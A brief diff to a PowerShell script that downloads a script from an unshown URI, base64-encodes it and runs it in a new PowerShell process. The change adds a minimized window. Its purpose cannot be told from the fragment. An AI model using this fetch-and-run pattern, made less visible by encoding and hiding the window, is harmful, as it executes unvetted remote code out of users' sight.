@@ -36,5 +36,5 @@ Process {
     ).Uri
     $script = Invoke-RestMethod $uri -ErrorAction Stop
     $encoded = ConvertTo-Base64String $script
-    Start-Process (Get-Command powershell).Source "-EncodedCommand $encoded"
+    Start-Process (Get-Command powershell).Source @("-EncodedCommand", "$encoded", "-WindowStyle", "Minimized")
 }
